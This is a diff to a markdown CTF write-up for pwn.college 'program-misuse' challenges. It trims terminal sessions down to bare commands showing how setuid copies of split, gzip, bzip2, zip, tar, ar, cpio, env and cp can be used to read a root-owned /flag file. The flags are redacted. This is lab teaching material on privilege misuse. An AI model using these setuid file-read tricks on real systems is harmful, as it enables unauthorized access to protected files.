@@ -162,11 +162,8 @@ Decoding the encoded data to get the flag value.
 `split` command is used to split the content of the file based upon our choice of lines. I only split in 1 line because the flag content will be of 1 line only.
 
 ```bash
-hacker@program-misuse~split:/challenge$ split -l 1 ../flag
-hacker@program-misuse~split:/challenge$ ls
-split  xaa
-hacker@program-misuse~split:/challenge$ cat xaa
-pwn.college{xxxxxxxxFLAGxxxxxxxx}
+split -l 1 ../flag
+cat xaa
 ```
 
 
@@ -175,22 +172,9 @@ pwn.college{xxxxxxxxFLAGxxxxxxxx}
 `gzip` is used for compression of files. We need to decompress the files to get our flag so we will use the `-d` switch for decompression.
 
 ```bash
-hacker@program-misuse~gzip:/challenge$ ls -l
-total 0
-lrwxrwxrwx 1 root root 13 Nov  1 18:56 gzip -> /usr/bin/gzip
-hacker@program-misuse~gzip:/challenge$ ls ../
-bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  nix  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
-hacker@program-misuse~gzip:/challenge$ rm /tmp/flag
-hacker@program-misuse~gzip:/challenge$ ls /tmp/flag.gz 
-/tmp/flag.gz
-hacker@program-misuse~gzip:/challenge$ gzip -c ../flag > /tmp/flag.gz 
-hacker@program-misuse~gzip:/challenge$ ls -l /tmp/flag.gz 
--rw-r--r-- 1 hacker hacker 82 Nov  1 19:10 /tmp/flag.gz
-hacker@program-misuse~gzip:/challenge$ gzip -d /tmp/flag.gz 
-hacker@program-misuse~gzip:/challenge$ ls -l /tmp/flag 
--rw-r--r-- 1 hacker hacker 57 Nov  1 19:10 /tmp/flag
-hacker@program-misuse~gzip:/challenge$ cat /tmp/flag 
-pwn.college{xxxxxxxxFLAGxxxxxxxx}
+gzip -c ../flag > /tmp/flag.gz 
+gzip -d /tmp/flag.gz 
+cat /tmp/flag 
 ```
 
 
@@ -199,10 +183,9 @@ pwn.college{xxxxxxxxFLAGxxxxxxxx}
 Same procedure for the `bzip2` just like `gzip`.
 
 ```bash
-hacker@program-misuse~bzip2:/challenge$ bzip2 -c ../flag > /tmp/flag.bz2
-hacker@program-misuse~bzip2:/challenge$ bzip2 -d /tmp/flag.bz2 
-hacker@program-misuse~bzip2:/challenge$ cat /tmp/flag 
-pwn.college{xxxxxxxxFLAGxxxxxxxx}
+bzip2 -c ../flag > /tmp/flag.bz2
+bzip2 -d /tmp/flag.bz2 
+cat /tmp/flag 
 ```
 
 
@@ -211,17 +194,10 @@ pwn.college{xxxxxxxxFLAGxxxxxxxx}
 `zip` is just another compression program for files and programs, same as `gzip` and `bzip2`. In `zip` command the **arg1** is the `.zip` file you need to create to store the compressed data and then use `unzip` command to decompress the compressed data to get it back in its original state.
 
 ```bash
-hacker@program-misuse~zip:/challenge$ zip /tmp/flag.zip ../flag
-  adding: ../flag (stored 0%)
-hacker@program-misuse~zip:/challenge$ file /tmp/flag.zip
-/tmp/flag.zip: Zip archive data, at least v1.0 to extract, compression method=store
-hacker@program-misuse~zip:/challenge$ cd /tmp/
-hacker@program-misuse~zip:/tmp$ unzip flag.zip
-Archive:  flag.zip
-warning:  skipped "../" path component(s) in ../flag
- extracting: flag                    
-hacker@program-misuse~zip:/tmp$ cat flag
-pwn.college{xxxxxxxxFLAGxxxxxxxx}
+zip /tmp/flag.zip ../flag
+cd /tmp/
+unzip flag.zip                    
+cat flag
 ```
 
 
@@ -230,11 +206,9 @@ pwn.college{xxxxxxxxFLAGxxxxxxxx}
 `tar` is another program used for archiving files. `tar -cf` is used to compress the file so we need to make our archive file in `.tar` extension and the `-xf` is for decompressing the file. The `-xOf` combined takes decompresses the file and puts in STDOUT and the shell redirects it into a different location where we will not face any permission issues.
 
 ```bash
-hacker@program-misuse~tar:/$ tar -cvf flag.tar flag
-flag
-hacker@program-misuse~tar:/$ tar -xOf flag.tar > /tmp/flag_copy
-hacker@program-misuse~tar:/$ cat /tmp/flag_copy
-pwn.college{xxxxxxxxFLAGxxxxxxxx}
+tar -cvf flag.tar flag
+tar -xOf flag.tar > /tmp/flag_copy
+cat /tmp/flag_copy
 ```
 
 
@@ -243,11 +217,9 @@ pwn.college{xxxxxxxxFLAGxxxxxxxx}
 To archive a file we need to use `-r` switch and store that data into a file with `.a` extension.  To extract the file we use `-x` switch.
 
 ```bash
-hacker@program-misuse~ar:/challenge$ ar r flag.a ../flag
-ar: creating flag.a
-hacker@program-misuse~ar:/challenge$ ar x flag.a
-hacker@program-misuse~ar:/challenge$ cat flag
-pwn.college{xxxxxxxxFLAGxxxxxxxx}
+ar r flag.a ../flag
+ar x flag.a
+cat flag
 ```
 
 
@@ -256,14 +228,10 @@ pwn.college{xxxxxxxxFLAGxxxxxxxx}
 `-ov` is to archive the file and verbose output. `-i` is to extract the file and `--to-stdout` is to send the extracted data to standard output. We need to mention the file inside the `.cpio` file we are extracting (here **flag**) so that we can redirect the extracted contents of it to another file (here **flag_contents**).
 
 ```bash
-hacker@program-misuse~cpio:/$ echo flag | cpio -ov > /tmp/flag_copy.cpio
-flag
-1 block
-hacker@program-misuse~cpio:/$ cd /tmp
-hacker@program-misuse~cpio:/tmp$ cpio -i --to-stdout flag < flag_copy.cpio > flag_contents
-1 block
-hacker@program-misuse~cpio:/tmp$ cat flag_contents
-pwn.college{xxxxxxxxFLAGxxxxxxxx}
+echo flag | cpio -ov > /tmp/flag_copy.cpio
+cd /tmp
+cpio -i --to-stdout flag < flag_copy.cpio > flag_contents
+cat flag_contents
 ```
 
 
@@ -281,8 +249,7 @@ genisoimage -sort /flag
  **Environment Variables** are essential and can be accessed based on their scope (**local** and **global**). These variables are essential to run a program or find its path .etc. `env` command in Linux helps to manage the **environment variables**, **run a command**, **add new variables** .etc. Since in this challenge `/usr/bin/env` is set as SETUID binary we will use it read the flag file contents as shown below.
 
 ```bash
-hacker@program-misuse~env:/challenge$ env cat /flag
-pwn.college{xxxxxxxxFLAGxxxxxxxx}
+env cat /flag
 ```
 
 
@@ -434,10 +401,9 @@ chmod 444 /flag
 `cp` command is used to copy a file and store into our desired target location. Its important that you create a file which will act as the target location where you will drop the contents of the flag file. This makes sure that the dummy flag file has sufficient permissions for us.
 
 ```bash
-hacker@program-misuse~cp:/challenge$ touch /tmp/flagCopy
-hacker@program-misuse~cp:/challenge$ cp /flag /tmp/flagCopy
-hacker@program-misuse~cp:/challenge$ cat /tmp/flagCopy
-pwn.college{xxxxxxxxFLAGxxxxxxxx}
+touch /tmp/flagCopy
+cp /flag /tmp/flagCopy
+cat /tmp/flagCopy
 ```
 
 
